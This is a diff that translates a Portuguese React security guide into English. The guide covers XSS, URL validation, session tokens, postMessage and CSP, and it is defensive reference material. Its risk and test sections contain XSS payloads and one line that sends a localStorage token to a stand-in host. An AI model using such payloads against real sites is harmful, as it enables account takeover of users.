@@ -1,35 +1,35 @@
-# React — segurança
+# React — security
 
-Última revisão: 2026-11-03
+Last reviewed: 2026-11-03
 
-Escopo: React 18 e 19 no navegador (SPA com Vite ou similar), JavaScript ou TypeScript. Next.js tem referência própria (`javascript-typescript-nextjs-security.md`). A segurança real fica no backend; o front reduz superfície de XSS e vazamento.
+Scope: React 18 and 19 in the browser (SPA with Vite or similar), JavaScript or TypeScript. Next.js has its own reference (`javascript-typescript-nextjs-security.md`). Real security lives in the backend; the front end reduces the XSS and leakage surface.
 
-## Recomendações
+## Recommendations
 
-- Texto em JSX é escapado. Mantenha dado externo como texto e evite caminhos que pulam o escape.
-- `dangerouslySetInnerHTML` só com HTML sanitizado (ex.: DOMPurify) imediatamente antes do uso, nunca com string vinda direto da API ou da URL.
-- URLs em `href`, `src`, `action` e `window.location`: valide o protocolo (`https:`, `http:`, `mailto:` conforme o caso) com `new URL()`. Não conte com o React para bloquear `javascript:`.
-- Não use `eval`, `new Function`, nem `setTimeout` com string sobre dado externo.
-- Acesso direto ao DOM (`ref.current.innerHTML`, `insertAdjacentHTML`, bibliotecas jQuery) volta a ser XSS; aplique a mesma regra de sanitização.
-- Segredos: tudo no bundle é público. Variáveis com prefixo de exposição (ex.: `VITE_`) chegam ao navegador. Chave de API privada fica no backend.
-- Token de sessão: prefira cookie `HttpOnly` definido pelo backend. Token em `localStorage` é legível por qualquer XSS.
-- Autorização na UI (esconder botão, rota protegida no router) é conveniência. O backend precisa negar.
-- `postMessage`: confira `event.origin` contra allowlist antes de usar `event.data`; ao enviar, passe a origem alvo, não `'*'`.
-- Links externos com `target="_blank"`: `rel="noopener noreferrer"`.
-- CSP no servidor que entrega o app; evite `unsafe-inline` e `unsafe-eval` quando o build permitir.
-- Dependências: revise pacotes de componentes que injetam HTML (markdown, rich text, editor) e mantenha o lockfile.
+- Text in JSX is escaped. Keep external data as text and avoid paths that skip the escaping.
+- `dangerouslySetInnerHTML` only with sanitized HTML (e.g. DOMPurify) immediately before use, never with a string coming straight from the API or the URL.
+- URLs in `href`, `src`, `action`, and `window.location`: validate the protocol (`https:`, `http:`, `mailto:` as appropriate) with `new URL()`. Do not count on React to block `javascript:`.
+- Do not use `eval`, `new Function`, or `setTimeout` with a string over external data.
+- Direct DOM access (`ref.current.innerHTML`, `insertAdjacentHTML`, jQuery libraries) brings XSS back; apply the same sanitization rule.
+- Secrets: everything in the bundle is public. Variables with an exposure prefix (e.g. `VITE_`) reach the browser. A private API key stays in the backend.
+- Session token: prefer an `HttpOnly` cookie set by the backend. A token in `localStorage` is readable by any XSS.
+- Authorization in the UI (hiding a button, a protected route in the router) is a convenience. The backend must deny.
+- `postMessage`: check `event.origin` against an allowlist before using `event.data`; when sending, pass the target origin, not `'*'`.
+- External links with `target="_blank"`: `rel="noopener noreferrer"`.
+- A CSP on the server that delivers the app; avoid `unsafe-inline` and `unsafe-eval` when the build allows.
+- Dependencies: review component packages that inject HTML (markdown, rich text, editors) and keep the lockfile.
 
-## Vulnerabilidades comuns
+## Common vulnerabilities
 
-- XSS por `dangerouslySetInnerHTML={{ __html: comentario }}`.
-- XSS por `<a href={perfil.site}>` com `javascript:alert(1)`.
-- Renderizador de markdown configurado para aceitar HTML bruto.
-- Token roubado de `localStorage` por script injetado ou dependência comprometida.
-- Chave de serviço de terceiros embutida no bundle.
+- XSS by `dangerouslySetInnerHTML={{ __html: comment }}`.
+- XSS by `<a href={profile.site}>` with `javascript:alert(1)`.
+- A markdown renderer configured to accept raw HTML.
+- A token stolen from `localStorage` by injected script or a compromised dependency.
+- A third-party service key embedded in the bundle.
 - Open redirect: `window.location = params.get('next')`.
-- Dados sensíveis deixados em estado global persistido (Redux persist) ou em logs do console.
+- Sensitive data left in persisted global state (Redux persist) or in console logs.
 
-## Implementação segura
+## Secure implementation
 
 ```tsx
 import DOMPurify from 'dompurify';
@@ -54,7 +54,7 @@ export function Comment({ html, site }: { html: string; site: string }) {
 }
 ```
 
-## Implementação inadequada e risco
+## Inadequate implementation and risk
 
 ```tsx
 export function Comment({ html, site }: { html: string; site: string }) {
@@ -67,17 +67,17 @@ export function Comment({ html, site }: { html: string; site: string }) {
 }
 ```
 
-Risco: um comentário com `<img src=x onerror=...>` roda script de todo leitor; um site `javascript:fetch('//x?c='+localStorage.token)` executa ao clicar. Com token em `localStorage`, isso vira sequestro de conta.
+Risk: a comment with `<img src=x onerror=...>` runs script for every reader; a site `javascript:fetch('//x?c='+localStorage.token)` executes on click. With a token in `localStorage`, this becomes account takeover.
 
-## Testes de segurança
+## Security tests
 
-- Testing Library: renderizar com payloads (`<img src=x onerror=...>`, `<svg onload=...>`) e afirmar que nenhum atributo `on*` sobra no DOM.
-- `safeHref('javascript:alert(1)')` retorna `undefined`.
-- Busca no bundle de produção por chaves e URLs internas que não deveriam estar lá.
-- Rotas protegidas: chamar a API diretamente sem permissão e confirmar a recusa do backend.
-- Ferramentas opcionais: `eslint-plugin-react` (regras `react/no-danger`, `react/jsx-no-target-blank`), `npm audit`, Semgrep.
+- Testing Library: render with payloads (`<img src=x onerror=...>`, `<svg onload=...>`) and assert that no `on*` attribute is left in the DOM.
+- `safeHref('javascript:alert(1)')` returns `undefined`.
+- Search the production bundle for keys and internal URLs that should not be there.
+- Protected routes: call the API directly without permission and confirm the backend refuses.
+- Optional tools: `eslint-plugin-react` (rules `react/no-danger`, `react/jsx-no-target-blank`), `npm audit`, Semgrep.
 
-## Fontes
+## Sources
 
 - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
 - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
